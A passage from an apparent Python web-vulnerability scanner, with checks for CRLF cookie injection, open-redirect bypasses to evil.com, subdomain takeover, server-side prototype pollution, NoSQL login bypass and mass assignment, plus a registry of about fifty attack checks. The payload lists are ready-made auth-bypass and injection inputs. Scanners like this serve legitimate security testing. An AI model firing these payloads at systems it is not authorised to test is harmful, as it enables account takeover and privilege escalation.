                    findings.append(_finding(
                        template_id="pro-jwt-none-forge",
                        name="JWT Forged with alg=none Accepted",
                        severity="critical",
                        url=url,
                        description="Forged JWT with alg=none and admin payload was accepted.",
                        confidence="firm",
                        remediation="Reject alg=none JWTs. Validate JWT signatures.",
                    ))
    except Exception as e:
        log.debug("jwt_key_confusion error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 44. cookie_injection
# ═════════════════════════════════════════════════════════════════════════════

async def cookie_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """CRLF injection in cookie values to inject new cookies or headers."""
    findings: list[ScanFinding] = []

    cookie_payloads = [
        ("test\r\nSet-Cookie: injected=true", "CRLF Set-Cookie injection"),
        ("test%0d%0aSet-Cookie: injected=true", "URL-encoded CRLF cookie injection"),
        ("test; injected=true", "semicolon cookie injection"),
        ("test\r\nX-Injected: true", "CRLF header injection via cookie"),
    ]

    try:
        for payload, desc in cookie_payloads:
            resp = await _safe_get(client, url, cookies={"session": payload})
            if not resp:
                continue

            # Check if injection appeared in response headers
            resp_headers_str = str(resp.headers).lower()
            if "injected" in resp_headers_str:
                findings.append(_finding(
                    template_id="pro-cookie-injection",
                    name=f"Cookie Injection ({desc})",
                    severity="medium",
                    url=url,
                    description=f"CRLF in cookie value resulted in header injection. Technique: {desc}",
                    confidence="confirmed",
                    remediation="Sanitize cookie values. Strip CR/LF characters.",
                ))
                return findings

            # Check if cookie value is reflected in response body
            if payload in resp.text or "injected" in resp.text:
                findings.append(_finding(
                    template_id="pro-cookie-reflection",
                    name=f"Cookie Value Reflected ({desc})",
                    severity="low",
                    url=url,
                    description=f"Cookie value reflected in response body: {desc}",
                    confidence="tentative",
                    remediation="HTML-encode reflected cookie values.",
                ))
                return findings
    except Exception as e:
        log.debug("cookie_injection error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 45. open_redirect_advanced
# ═════════════════════════════════════════════════════════════════════════════

async def open_redirect_advanced(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """20+ parser-differential open redirect bypass payloads."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    redirect_keys = ["url", "redirect", "next", "return", "returnUrl", "return_url",
                      "continue", "dest", "destination", "go", "target", "to", "out",
                      "redir", "redirect_uri", "callback", "path", "forward"]

    redirect_payloads = [
        ("//evil.com", "protocol-relative"),
        ("https://evil.com", "direct HTTPS"),
        ("/\\evil.com", "backslash"),
        ("////evil.com", "quadruple slash"),
        ("https:evil.com", "missing slashes"),
        ("//%09/evil.com", "tab bypass"),
        ("//evil%E3%80%82com", "fullwidth dot"),
        ("https://evil.com%23@legitimate.com", "fragment bypass"),
        ("https://legitimate.com@evil.com", "authority bypass"),
        ("//evil.com/%2f%2e%2e", "encoded path bypass"),
        ("/%0d/evil.com", "CR bypass"),
        ("/%09/evil.com", "tab in path"),
        ("javascript:alert(1)", "javascript protocol"),
        ("data:text/html,<h1>pwned</h1>", "data URI"),
        ("//%E2%80%AE/evil.com", "RTL override"),
        ("https://evil.com/.legitimate.com", "path confusion"),
        ("///evil.com", "triple slash"),
        ("https://legitimate.com.evil.com", "subdomain confusion"),
        ("/\t/evil.com", "tab separator"),
        ("//evil%00.com", "null byte in domain"),
        ("https://evil.com#legitimate.com", "fragment confusion"),
    ]

    try:
        for key in params:
            if key.lower() not in redirect_keys:
                continue
            for payload, desc in redirect_payloads:
                new_params = {k: v[0] for k, v in params.items()}
                new_params[key] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(new_params, safe=":/%@#")))
                resp = await _safe_get(client, test_url)
                if not resp:
                    continue

                if resp.status_code in (301, 302, 303, 307, 308):
                    location = resp.headers.get("location", "")
                    if "evil.com" in location or "evil%E3%80%82com" in location:
                        findings.append(_finding(
                            template_id="pro-open-redirect",
                            name=f"Open Redirect ({desc})",
                            severity="medium",
                            url=url,
                            description=(
                                f"Parameter '{key}' causes redirect to attacker-controlled domain. "
                                f"Bypass technique: {desc}. Location: {location}"
                            ),
                            confidence="confirmed",
                            matched_at=test_url,
                            extracted=[location],
                            remediation="Validate redirect URLs against a whitelist. Don't allow external domains.",
                        ))
                        return findings

                # Check for meta refresh or JS redirect
                if resp.status_code == 200:
                    if "evil.com" in resp.text:
                        meta_redirect = re.search(r'<meta[^>]*http-equiv=["\']refresh["\'][^>]*evil\.com', resp.text, re.I)
                        js_redirect = re.search(r'(window\.location|location\.href|location\.replace)\s*[=(]\s*["\'][^"\']*evil\.com', resp.text, re.I)
                        if meta_redirect or js_redirect:
                            findings.append(_finding(
                                template_id="pro-open-redirect-dom",
                                name=f"Open Redirect via {'Meta Refresh' if meta_redirect else 'JavaScript'} ({desc})",
                                severity="medium",
                                url=url,
                                description=f"Client-side redirect to evil.com detected. Technique: {desc}",
                                confidence="firm",
                                matched_at=test_url,
                                remediation="Validate redirect targets server-side.",
                            ))
                            return findings
    except Exception as e:
        log.debug("open_redirect_advanced error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 46. subdomain_takeover_check
# ═════════════════════════════════════════════════════════════════════════════

async def subdomain_takeover_check(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Check for subdomain takeover indicators: dead CNAME, unclaimed services."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    hostname = parsed.netloc.split(":")[0]

    TAKEOVER_FINGERPRINTS = {
        "GitHub Pages": ["There isn't a GitHub Pages site here.", "For root URLs (like http://example.com/)"],
        "Heroku": ["No such app", "no-such-app.herokuapp.com", "herokucdn.com/error-pages"],
        "AWS S3": ["NoSuchBucket", "The specified bucket does not exist"],
        "Shopify": ["Sorry, this shop is currently unavailable.", "Only one step left!"],
        "Tumblr": ["There's nothing here.", "Whatever you were looking for doesn't currently exist"],
        "WordPress.com": ["Do you want to register"],
        "Pantheon": ["The gods are wise, but do not know of the site which you seek."],
        "Fastly": ["Fastly error: unknown domain"],
        "Ghost": ["The thing you were looking for is no longer here"],
        "Surge.sh": ["project not found"],
        "Bitbucket": ["Repository not found"],
        "Zendesk": ["Help Center Closed", "this help center no longer exists"],
        "Azure": ["404 Web Site not found"],
        "Netlify": ["Not Found - Request ID"],
        "Fly.io": ["404 Not Found"],
        "Vercel": ["DEPLOYMENT_NOT_FOUND"],
    }

    try:
        resp = await _safe_get(client, url)
        if not resp:
            return findings

        response_text = resp.text

        for service, fingerprints in TAKEOVER_FINGERPRINTS.items():
            for fp in fingerprints:
                if fp.lower() in response_text.lower():
                    findings.append(_finding(
                        template_id=f"pro-subdomain-takeover-{service.lower().replace(' ', '-').replace('.', '')}",
                        name=f"Subdomain Takeover ({service})",
                        severity="high",
                        url=url,
                        description=(
                            f"Hostname '{hostname}' shows {service} takeover fingerprint: '{fp}'. "
                            "The subdomain may be pointing to an unclaimed resource."
                        ),
                        confidence="tentative",
                        extracted=[fp],
                        remediation=f"Remove the DNS record pointing to {service}, or reclaim the resource.",
                    ))
                    return findings

        # Check for NXDOMAIN-style responses
        if resp.status_code in (404, 410) and len(resp.text) < 200:
            findings.append(_finding(
                template_id="pro-subdomain-possibly-dangling",
                name="Possibly Dangling Subdomain",
                severity="info",
                url=url,
                description=f"Subdomain '{hostname}' returns {resp.status_code} with minimal content. May be dangling.",
                confidence="tentative",
                remediation="Review DNS records for unused subdomains.",
            ))
    except Exception as e:
        log.debug("subdomain_takeover_check error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 47. prototype_pollution_server
# ═════════════════════════════════════════════════════════════════════════════

async def prototype_pollution_server(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Server-side prototype pollution via __proto__ and constructor.prototype in JSON."""
    findings: list[ScanFinding] = []

    pp_payloads = [
        {"__proto__": {"polluted": "true", "isAdmin": True}},
        {"constructor": {"prototype": {"polluted": "true"}}},
        {"__proto__": {"status": 200, "admin": True}},
        {"a": {"__proto__": {"polluted": "true"}}},
    ]

    pp_query_payloads = [
        "__proto__[polluted]=true",
        "__proto__.polluted=true",
        "constructor[prototype][polluted]=true",
        "constructor.prototype.polluted=true",
    ]

    try:
        # Test via JSON POST
        for payload in pp_payloads:
            resp = await _safe_post(client, url, json=payload)
            if resp and resp.status_code in (200, 201):
                try:
                    data = resp.json()
                    if isinstance(data, dict):
                        if data.get("polluted") == "true" or data.get("isAdmin") is True:
                            findings.append(_finding(
                                template_id="pro-prototype-pollution-server",
                                name="Server-Side Prototype Pollution",
                                severity="high",
                                url=url,
                                description=(
                                    f"__proto__ pollution reflected in response. "
                                    f"Payload: {json.dumps(payload)[:100]}. "
                                    "Attacker can modify application behavior via Object.prototype."
                                ),
                                confidence="firm",
                                extracted=["polluted"],
                                remediation="Use Object.create(null) for config objects. Sanitize __proto__ from JSON input.",
                            ))
                            return findings
                except Exception:
                    pass

        # Test via query parameters
        parsed = urlparse(url)
        for pp_query in pp_query_payloads:
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{pp_query}"
            resp = await _safe_get(client, test_url)
            if resp and resp.status_code == 200:
                if "polluted" in resp.text:
                    try:
                        data = resp.json()
                        if isinstance(data, dict) and data.get("polluted") == "true":
                            findings.append(_finding(
                                template_id="pro-prototype-pollution-query",
                                name="Server-Side Prototype Pollution (Query)",
                                severity="high",
                                url=url,
                                description=f"Prototype pollution via query: {pp_query}",
                                confidence="firm",
                                matched_at=test_url,
                                remediation="Sanitize __proto__ and constructor from all input.",
                            ))
                            return findings
                    except Exception:
                        pass
    except Exception as e:
        log.debug("prototype_pollution_server error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 48. nosql_injection_auth_bypass
# ═════════════════════════════════════════════════════════════════════════════

async def nosql_injection_auth_bypass(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """NoSQL injection auth bypass via MongoDB operators in login parameters."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    login_paths = ["/login", "/signin", "/api/auth/login", "/api/login",
                   "/auth", "/api/auth", "/api/v1/auth/login", parsed.path]

    nosql_payloads = [
        # JSON body payloads
        ({"username": {"$gt": ""}, "password": {"$gt": ""}}, "JSON $gt bypass"),
        ({"username": {"$ne": ""}, "password": {"$ne": ""}}, "JSON $ne bypass"),
        ({"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}, "JSON $regex bypass"),
        ({"username": {"$exists": True}, "password": {"$exists": True}}, "JSON $exists bypass"),
        ({"username": "admin", "password": {"$gt": ""}}, "admin $gt password"),
        ({"username": "admin", "password": {"$ne": ""}}, "admin $ne password"),
        ({"username": "admin", "password": {"$regex": ".*"}}, "admin $regex password"),
    ]

    # Query string payloads
    qs_payloads = [
        ("username=admin&password[$gt]=&", "$gt via query string"),
        ("username=admin&password[$ne]=invalid&", "$ne via query string"),
        ("username[$gt]=&password[$gt]=&", "both $gt via query string"),
        ("username[$regex]=.*&password[$regex]=.*&", "$regex via query string"),
    ]

    try:
        for path in login_paths:
            login_url = urljoin(base, path)

            # First, check if endpoint exists
            probe = await _safe_post(client, login_url, json={"username": "x", "password": "x"})
            if not probe or probe.status_code in (404, 405):
                probe = await _safe_post(client, login_url, data={"username": "x", "password": "x"})
                if not probe or probe.status_code in (404, 405):
                    continue

            fail_response = probe.text
            fail_status = probe.status_code
            fail_len = len(fail_response)

            # Test JSON payloads
            for payload, desc in nosql_payloads:
                resp = await _safe_post(client, login_url, json=payload)
                if not resp:
                    continue

                # Look for auth success indicators
                success = False
                if resp.status_code != fail_status and resp.status_code in (200, 302):
                    success = True
                if abs(len(resp.text) - fail_len) > 100:
                    success_indicators = ["token", "jwt", "session", "welcome", "dashboard", "logout", "success"]
                    if any(ind in resp.text.lower() for ind in success_indicators):
                        success = True

                if success:
                    findings.append(_finding(
                        template_id="pro-nosql-auth-bypass",
                        name=f"NoSQL Injection Auth Bypass ({desc})",
                        severity="critical",
                        url=login_url,
                        description=(
                            f"Authentication bypassed via NoSQL operator injection. "
                            f"Technique: {desc}. Normal login fails with status {fail_status}, "
                            f"NoSQL payload returned status {resp.status_code} with {len(resp.text)} bytes."
                        ),
                        confidence="firm",
                        remediation="Validate input types. Use mongoose Schema with strict types. Reject objects in auth params.",
                    ))
                    return findings

            # Test query string payloads
            for qs_payload, desc in qs_payloads:
                resp = await _safe_post(
                    client, login_url,
                    content=qs_payload.encode(),
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
                if resp and resp.status_code in (200, 302) and resp.status_code != fail_status:
                    findings.append(_finding(
                        template_id="pro-nosql-auth-bypass-qs",
                        name=f"NoSQL Auth Bypass via Query String ({desc})",
                        severity="critical",
                        url=login_url,
                        description=f"Auth bypass with {desc}. Status changed from {fail_status} to {resp.status_code}.",
                        confidence="firm",
                        remediation="Type-check authentication parameters server-side.",
                    ))
                    return findings
    except Exception as e:
        log.debug("nosql_injection_auth_bypass error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 49. mass_assignment_advanced
# ═════════════════════════════════════════════════════════════════════════════

async def mass_assignment_advanced(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Mass assignment: inject role, admin, is_admin, verified, and other privileged fields."""
    findings: list[ScanFinding] = []

    mass_fields = {
        "role": ["admin", "superadmin", "root"],
        "admin": ["true", "1"],
        "is_admin": ["true", "1"],
        "isAdmin": ["true", "1"],
        "verified": ["true", "1"],
        "is_verified": ["true", "1"],
        "email_verified": ["true", "1"],
        "active": ["true", "1"],
        "is_active": ["true", "1"],
        "is_staff": ["true", "1"],
        "is_superuser": ["true", "1"],
        "permissions": ["admin", "*"],
        "groups": ["admin", "administrators"],
        "balance": ["999999"],
        "credits": ["999999"],
        "subscription": ["premium", "enterprise"],
        "plan": ["premium", "enterprise"],
        "user_type": ["admin", "staff"],
    }

    try:
        # GET baseline
        baseline = await _safe_get(client, url)
        if not baseline:
            return findings

        # Try registering / updating with extra fields
        base_body = {"username": "pxetest_ma", "email": "pxetest@test.invalid", "password": "Test12345!"}

        for field, values in mass_fields.items():
            for val in values[:1]:
                # POST with extra field
                body = {**base_body, field: val}

                for content_type in ["json", "form"]:
                    if content_type == "json":
                        resp = await _safe_post(client, url, json=body)
                    else:
                        resp = await _safe_post(client, url, data=body)

                    if not resp or resp.status_code in (404, 405):
                        continue

                    if resp.status_code in (200, 201):
                        try:
                            data = resp.json()
                            if isinstance(data, dict):
                                # Check if the injected field was accepted
                                if field in data:
                                    if str(data[field]).lower() in [str(v).lower() for v in values]:
                                        findings.append(_finding(
                                            template_id="pro-mass-assignment",
                                            name=f"Mass Assignment ({field}={val})",
                                            severity="high",
                                            url=url,
                                            description=(
                                                f"Server accepted and stored privileged field '{field}' = '{val}'. "
                                                "Attacker can escalate privileges by including extra fields in requests."
                                            ),
                                            confidence="firm",
                                            extracted=[f"{field}={data[field]}"],
                                            remediation="Use explicit field whitelists. Never bind all request parameters directly.",
                                        ))
                                        return findings
                        except Exception:
                            pass

                # Also try PUT/PATCH for profile update
                for method in ["PUT", "PATCH"]:
                    update_body = {field: val}
                    resp = await _safe_request(client, method, url, json=update_body)
                    if resp and resp.status_code in (200, 201):
                        try:
                            data = resp.json()
                            if isinstance(data, dict) and field in data:
                                if str(data[field]).lower() in [str(v).lower() for v in values]:
                                    findings.append(_finding(
                                        template_id=f"pro-mass-assignment-{method.lower()}",
                                        name=f"Mass Assignment via {method} ({field}={val})",
                                        severity="high",
                                        url=url,
                                        description=f"Privileged field '{field}' accepted via {method} request.",
                                        confidence="firm",
                                        remediation="Whitelist allowed fields for update operations.",
                                    ))
                                    return findings
                        except Exception:
                            pass
    except Exception as e:
        log.debug("mass_assignment_advanced error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 50. api_version_downgrade
# ═════════════════════════════════════════════════════════════════════════════

async def api_version_downgrade(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Downgrade API version (e.g. /v2/ -> /v1/) to find deprecated, less-secure endpoints."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    path = parsed.path

    # Detect API version in path
    version_pattern = re.search(r'/v(\d+)(/|$)', path)
    if not version_pattern:
        # Try common API paths
        version_pattern = re.search(r'/api/v(\d+)(/|$)', path)

    if not version_pattern:
        # No version in URL, try probing
        base = f"{parsed.scheme}://{parsed.netloc}"
        for v in [1, 2]:
            for prefix in ["/api/v", "/v"]:
                probe_url = urljoin(base, f"{prefix}{v}/")
                resp = await _safe_get(client, probe_url)
                if resp and resp.status_code in (200, 301, 302) and resp.status_code != 404:
                    findings.append(_finding(
                        template_id="pro-api-version-found",
                        name=f"API Version Endpoint Found ({prefix}{v})",
                        severity="info",
                        url=probe_url,
                        description=f"API version endpoint {prefix}{v}/ is accessible (status {resp.status_code}).",
                        confidence="confirmed",
                    ))
        return findings

    current_version = int(version_pattern.group(1))

    try:
        # Get baseline response from current version
        baseline = await _safe_get(client, url)
        if not baseline:
            return findings

        # Try older versions
        for older_v in range(max(0, current_version - 3), current_version):
            old_path = path.replace(f"/v{current_version}", f"/v{older_v}")
            old_url = urlunparse(parsed._replace(path=old_path))

            resp = await _safe_get(client, old_url)
            if not resp:
                continue

            if resp.status_code == 200:
                # Check if older version returns data
                if len(resp.text) > 50:
                    # Compare with current version
                    extra_fields = []
                    try:
                        old_data = resp.json()
                        new_data = baseline.json()
                        if isinstance(old_data, dict) and isinstance(new_data, dict):
                            extra_fields = [k for k in old_data if k not in new_data]
                    except Exception:
                        pass

                    severity = "medium" if extra_fields else "low"
                    desc = f" Extra fields in old version: {', '.join(extra_fields[:5])}" if extra_fields else ""

                    findings.append(_finding(
                        template_id="pro-api-version-downgrade",
                        name=f"API Version Downgrade (v{current_version} -> v{older_v})",
                        severity=severity,
                        url=old_url,
                        description=(
                            f"Older API version v{older_v} still accessible. "
                            f"May lack security controls present in v{current_version}.{desc}"
                        ),
                        confidence="confirmed",
                        matched_at=old_url,
                        remediation="Deprecate and disable old API versions. Apply same auth/authz to all versions.",
                    ))

            elif resp.status_code in (401, 403):
                # Old version exists but is protected differently
                if baseline.status_code == 200:
                    findings.append(_finding(
                        template_id="pro-api-version-different-auth",
                        name=f"API Version Auth Difference (v{current_version} vs v{older_v})",
                        severity="info",
                        url=old_url,
                        description=(
                            f"API v{older_v} returns {resp.status_code} while v{current_version} returns {baseline.status_code}. "
                            "Different authentication requirements across versions."
                        ),
                        confidence="confirmed",
                    ))

        # Try newer versions too
        for newer_v in range(current_version + 1, current_version + 4):
            new_path = path.replace(f"/v{current_version}", f"/v{newer_v}")
            new_url = urlunparse(parsed._replace(path=new_path))
            resp = await _safe_get(client, new_url)
            if resp and resp.status_code == 200:
                findings.append(_finding(
                    template_id="pro-api-version-unreleased",
                    name=f"Unreleased API Version Found (v{newer_v})",
                    severity="medium",
                    url=new_url,
                    description=f"API v{newer_v} accessible (possibly unreleased/beta). May have incomplete security.",
                    confidence="tentative",
                    remediation="Restrict access to unreleased API versions.",
                ))
    except Exception as e:
        log.debug("api_version_downgrade error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# CUSTOM_CHECKS_PRO Registry
# ═════════════════════════════════════════════════════════════════════════════

CUSTOM_CHECKS_PRO: dict[str, any] = {
    # Blind/Advanced SQL Injection (5)
    "boolean_blind_sqli": boolean_blind_sqli,
    "union_sqli": union_sqli,
    "oob_sqli": oob_sqli,
    "second_order_sqli": second_order_sqli,
    "error_sqli_fingerprint": error_sqli_fingerprint,
    # Advanced XSS (5)
    "stored_xss_comprehensive": stored_xss_comprehensive,
    "dom_xss_advanced": dom_xss_advanced,
    "mutation_xss": mutation_xss,
    "xss_filter_bypass": xss_filter_bypass,
    "csp_bypass_xss": csp_bypass_xss,
    # XXE Advanced (3)
    "oob_xxe": oob_xxe,
    "blind_xxe_error": blind_xxe_error,
    "xinclude_injection": xinclude_injection,
    # Server-Side (5)
    "log4shell": log4shell,
    "xslt_injection": xslt_injection,
    "blind_ldap_injection": blind_ldap_injection,
    "nosql_advanced": nosql_advanced,
    "expression_language_injection": expression_language_injection,
    # Auth/Session (4)
    "session_fixation": session_fixation,
    "username_enumeration": username_enumeration,
    "password_policy": password_policy,
    "auth_bypass_expanded": auth_bypass_expanded,
    # Protocol-Level (5)
    "h2_smuggling": h2_smuggling,
    "websocket_injection": websocket_injection,
    "http_response_splitting": http_response_splitting,
    "clickjacking_check": clickjacking_check,
    "tls_configuration": tls_configuration,
    # Business Logic (4)
    "price_manipulation": price_manipulation,
    "race_condition_advanced": race_condition_advanced,
    "idor_comprehensive": idor_comprehensive,
    "privilege_escalation": privilege_escalation,
    # Data Format (4)
    "csv_injection": csv_injection,
    "smtp_injection": smtp_injection,
    "json_injection": json_injection,
    "html_injection": html_injection,
    # Infrastructure (3)
    "ssrf_protocol": ssrf_protocol,
    "backup_file_probe": backup_file_probe,
    "debug_endpoint_probe": debug_endpoint_probe,
    # Additional (12)
    "graphql_introspection": graphql_introspection,
    "cors_wildcard_credentials": cors_wildcard_credentials,
    "host_header_ssrf": host_header_ssrf,
    "request_smuggling_te_cl": request_smuggling_te_cl,
    "jwt_key_confusion": jwt_key_confusion,
    "cookie_injection": cookie_injection,
    "open_redirect_advanced": open_redirect_advanced,
    "subdomain_takeover_check": subdomain_takeover_check,
    "prototype_pollution_server": prototype_pollution_server,
    "nosql_injection_auth_bypass": nosql_injection_auth_bypass,
    "mass_assignment_advanced": mass_assignment_advanced,
    "api_version_downgrade": api_version_downgrade,
}
